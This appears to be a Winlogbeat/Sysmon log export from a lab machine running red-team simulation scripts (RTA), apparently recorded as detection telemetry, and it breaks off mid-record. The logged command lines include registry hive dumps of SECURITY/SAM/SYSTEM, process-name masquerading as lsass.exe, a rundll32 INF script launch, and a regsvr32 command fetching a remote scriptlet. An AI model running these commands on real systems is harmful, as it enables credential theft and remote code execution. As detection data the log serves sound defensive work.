{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"tF_38WUBfVn9xHWinTx_"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:13:13.885","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Description":"Windows-Befehlsprozessor","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2932","ParentProcessId":"3756","IntegrityLevel":"Medium","TerminalSessionId":"1","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\registry_persistence_create.py\"","User":"flare-PC\\flare","ProcessGuid":"{2D3B23BE-4B69-5BA2-0000-00101F0A1800}"},"@timestamp":"2018-09-19T13:13:13.885Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:13.885\nProcessGuid: {2D3B23BE-4B69-5BA2-0000-00101F0A1800}\nProcessId: 2932\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\registry_persistence_create.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1430","event_id":1,"host":{"name":"flare-PC"},"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"sF_38WUBfVn9xHWinTx_"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:13:13.823","UtcTime":"2018-09-19 13:13:13.823","Image":"C:\\Windows\\SysWOW64\\reg.exe","TargetFilename":"C:\\Users\\flare\\Downloads\\RTA-master\\system.reg","ProcessId":"3704","ProcessGuid":"{2D3B23BE-4B69-5BA2-0000-001051071800}"},"@timestamp":"2018-09-19T13:13:13.823Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:13:13.823\nProcessGuid: {2D3B23BE-4B69-5BA2-0000-001051071800}\nProcessId: 3704\nImage: C:\\Windows\\SysWOW64\\reg.exe\nTargetFilename: C:\\Users\\flare\\Downloads\\RTA-master\\system.reg\nCreationUtcTime: 2018-09-19 13:13:13.823","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1427","event_id":11,"version":2,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"host":{"name":"flare-PC"},"task":"File created (rule: FileCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"uV_38WUBfVn9xHWinTyB"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:13:13.666","UtcTime":"2018-09-19 13:13:13.666","Image":"C:\\Windows\\SysWOW64\\reg.exe","TargetFilename":"C:\\Users\\flare\\Downloads\\RTA-master\\sam.reg","ProcessId":"3944","ProcessGuid":"{2D3B23BE-4B69-5BA2-0000-001011011800}"},"@timestamp":"2018-09-19T13:13:13.666Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:13:13.666\nProcessGuid: {2D3B23BE-4B69-5BA2-0000-001011011800}\nProcessId: 3944\nImage: C:\\Windows\\SysWOW64\\reg.exe\nTargetFilename: C:\\Users\\flare\\Downloads\\RTA-master\\sam.reg\nCreationUtcTime: 2018-09-19 13:13:13.666","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":11,"record_number":"1421","host":{"name":"flare-PC"},"version":2,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"task":"File created (rule: FileCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"ul_38WUBfVn9xHWinTyB"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","ParentProcessGuid":"{2D3B23BE-4B69-5BA2-0000-00109FD61700}","UtcTime":"2018-09-19 13:13:13.791","Image":"C:\\Windows\\SysWOW64\\reg.exe","Description":"Konsolenregistrierungsprogramm","Hashes":"MD5=D69A9ABBB0D795F21995C2F48C1EB560,SHA256=36414C7E57AFA6136D77FD47F4C55102E35F2475FBCD719728DA7D14B1590E2A","Product":"Betriebssystem Microsoft® Windows®","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\registry_hive_export.py","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"472","ParentProcessId":"3828","IntegrityLevel":"Medium","TerminalSessionId":"1","CommandLine":"reg.exe save hklm\\security C:\\Users\\flare\\Downloads\\RTA-master\\security.reg","User":"flare-PC\\flare","ProcessGuid":"{2D3B23BE-4B69-5BA2-0000-001046061800}"},"@timestamp":"2018-09-19T13:13:13.791Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:13.791\nProcessGuid: {2D3B23BE-4B69-5BA2-0000-001046061800}\nProcessId: 472\nImage: C:\\Windows\\SysWOW64\\reg.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Konsolenregistrierungsprogramm\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: reg.exe save hklm\\security C:\\Users\\flare\\Downloads\\RTA-master\\security.reg\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=D69A9ABBB0D795F21995C2F48C1EB560,SHA256=36414C7E57AFA6136D77FD47F4C55102E35F2475FBCD719728DA7D14B1590E2A\nParentProcessGuid: {2D3B23BE-4B69-5BA2-0000-00109FD61700}\nParentProcessId: 3828\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\registry_hive_export.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","type":"wineventlog","event_id":1,"host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"record_number":"1425","version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"u1_38WUBfVn9xHWinTyB"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:13:13.823","UtcTime":"2018-09-19 13:13:13.870","Image":"C:\\Windows\\SysWOW64\\reg.exe","TargetFilename":"C:\\Users\\flare\\Downloads\\RTA-master\\system.reg","ProcessId":"1344","ProcessGuid":"{2D3B23BE-4B69-5BA2-0000-001092081800}"},"@timestamp":"2018-09-19T13:13:13.870Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:13:13.870\nProcessGuid: {2D3B23BE-4B69-5BA2-0000-001092081800}\nProcessId: 1344\nImage: C:\\Windows\\SysWOW64\\reg.exe\nTargetFilename: C:\\Users\\flare\\Downloads\\RTA-master\\system.reg\nCreationUtcTime: 2018-09-19 13:13:13.823","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1429","event_id":11,"version":2,"host":{"name":"flare-PC"},"task":"File created (rule: FileCreate)","user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"pl_38WUBfVn9xHWicDzT"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:13:02.652","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\csrss.exe","ProcessId":"4004","ProcessGuid":"{2D3B23BE-4B5B-5BA2-0000-001049A31700}"},"@timestamp":"2018-09-19T13:13:02.652Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process terminated:\nRuleName: \nUtcTime: 2018-09-19 13:13:02.652\nProcessGuid: {2D3B23BE-4B5B-5BA2-0000-001049A31700}\nProcessId: 4004\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\csrss.exe","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":5,"task":"Process terminated (rule: ProcessTerminate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"version":3,"record_number":"1411","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"qF_38WUBfVn9xHWidDzf"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:13:03.154","Description":"Windows-Befehlsprozessor","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","TerminalSessionId":"1","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\recycle_bin_process.py\"","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2664","ParentProcessId":"3756","IntegrityLevel":"Medium","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Company":"Microsoft Corporation","ProcessGuid":"{2D3B23BE-4B5F-5BA2-0000-0010BBA51700}"},"@timestamp":"2018-09-19T13:13:03.169Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:03.154\nProcessGuid: {2D3B23BE-4B5F-5BA2-0000-0010BBA51700}\nProcessId: 2664\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\recycle_bin_process.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","type":"wineventlog","event_id":1,"host":{"name":"flare-PC"},"version":5,"record_number":"1412","user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"p1_38WUBfVn9xHWidDzf"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4B5F-5BA2-0000-0010BBA51700}","User":"flare-PC\\flare","Product":"?","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","Image":"C:\\Program Files (x86)\\Python27\\python.exe","Description":"?","LogonId":"0xe320","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\recycle_bin_process.py\"","FileVersion":"?","Company":"?","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\recycle_bin_process.py","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"632","ParentProcessId":"2664","IntegrityLevel":"Medium","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","UtcTime":"2018-09-19 13:13:03.169","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4B5F-5BA2-0000-001004A71700}"},"@timestamp":"2018-09-19T13:13:03.185Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:03.169\nProcessGuid: {2D3B23BE-4B5F-5BA2-0000-001004A71700}\nProcessId: 632\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\recycle_bin_process.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4B5F-5BA2-0000-0010BBA51700}\nParentProcessId: 2664\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\recycle_bin_process.py\"","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1413","type":"wineventlog","version":5,"host":{"name":"flare-PC"},"event_id":1,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"xV_38WUBfVn9xHWiuzxO"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:13:20.185","Hashes":"MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670","Description":"Windows-Hostprozess (Rundll32)","User":"flare-PC\\flare","Image":"C:\\Windows\\SysWOW64\\rundll32.exe","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\rundll32_inf_callback.py","ParentProcessGuid":"{2D3B23BE-4B6D-5BA2-0000-00109BC41800}","TerminalSessionId":"1","CommandLine":"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\script_launch.inf","ParentProcessId":"2940","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","ProcessId":"2556","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","IntegrityLevel":"Medium","ProcessGuid":"{2D3B23BE-4B70-5BA2-0000-001062341900}"},"@timestamp":"2018-09-19T13:13:20.185Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:13:20.185\nProcessGuid: {2D3B23BE-4B70-5BA2-0000-001062341900}\nProcessId: 2556\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows-Hostprozess (Rundll32)\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\bin\\script_launch.inf\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670\nParentProcessGuid: {2D3B23BE-4B6D-5BA2-0000-00109BC41800}\nParentProcessId: 2940\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\rundll32_inf_callback.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1442","event_id":1,"version":5,"host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"nl_38WUBfVn9xHWiQDyz"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:12:50.512","Hashes":"MD5=0D19266C09D4DEAC5836E572BE912A39,SHA256=DAB5DC65269C0F834EADE5177F8FB486C08685EB6773369576303855F70EF82F","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\lsass.exe","Product":"?","ParentProcessGuid":"{2D3B23BE-4B4D-5BA2-0000-0010C9721700}","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"?","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\process_name_masquerade.py","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\lsass.exe","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ParentProcessId":"4040","Company":"?","IntegrityLevel":"Medium","ProcessId":"2596","Description":"?","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4B52-5BA2-0000-00103F9F1700}"},"@timestamp":"2018-09-19T13:12:50.512Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:12:50.512\nProcessGuid: {2D3B23BE-4B52-5BA2-0000-00103F9F1700}\nProcessId: 2596\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\lsass.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\lsass.exe\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=0D19266C09D4DEAC5836E572BE912A39,SHA256=DAB5DC65269C0F834EADE5177F8FB486C08685EB6773369576303855F70EF82F\nParentProcessGuid: {2D3B23BE-4B4D-5BA2-0000-0010C9721700}\nParentProcessId: 4040\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\process_name_masquerade.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","task":"Process Create (rule: ProcessCreate)","record_number":"1404","host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"version":5,"event_id":1,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"oF_38WUBfVn9xHWiUDy3"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4B4D-5BA2-0000-0010C9721700}","Product":"?","LogonId":"0xe320","Image":"C:\\Users\\flare\\Downloads\\RTA-master\\services.exe","Hashes":"MD5=0D19266C09D4DEAC5836E572BE912A39,SHA256=DAB5DC65269C0F834EADE5177F8FB486C08685EB6773369576303855F70EF82F","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:12:54.935","FileVersion":"?","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\process_name_masquerade.py","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"?","CommandLine":"C:\\Users\\flare\\Downloads\\RTA-master\\services.exe","ProcessId":"2592","TerminalSessionId":"1","IntegrityLevel":"Medium","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ParentProcessId":"4040","Description":"?","ProcessGuid":"{2D3B23BE-4B56-5BA2-0000-001051A11700}"},"@timestamp":"2018-09-19T13:12:54.935Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:12:54.935\nProcessGuid: {2D3B23BE-4B56-5BA2-0000-001051A11700}\nProcessId: 2592\nImage: C:\\Users\\flare\\Downloads\\RTA-master\\services.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: C:\\Users\\flare\\Downloads\\RTA-master\\services.exe\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=0D19266C09D4DEAC5836E572BE912A39,SHA256=DAB5DC65269C0F834EADE5177F8FB486C08685EB6773369576303855F70EF82F\nParentProcessGuid: {2D3B23BE-4B4D-5BA2-0000-0010C9721700}\nParentProcessId: 4040\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\process_name_masquerade.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"type":"wineventlog","host":{"name":"flare-PC"},"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"record_number":"1407","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"vl_38WUBfVn9xHWiqjxn"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4B6C-5BA2-0000-00104DA91800}","Product":"Betriebssystem Microsoft® Windows®","LogonId":"0xe320","Image":"C:\\Windows\\SysWOW64\\notepad.exe","Hashes":"MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B","User":"flare-PC\\flare","Description":"Editor","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"regsvr32.exe /u /n /s /i:http://172.16.100.10:8000/bin/notepad.sct scrobj.dll","ParentImage":"C:\\Windows\\SysWOW64\\regsvr32.exe","TerminalSessionId":"1","CommandLine":"\"C:\\Windows\\System32\\notepad.exe\" ","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","Company":"Microsoft Corporation","ParentProcessId":"4088","IntegrityLevel":"Medium","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","UtcTime":"2018-09-19 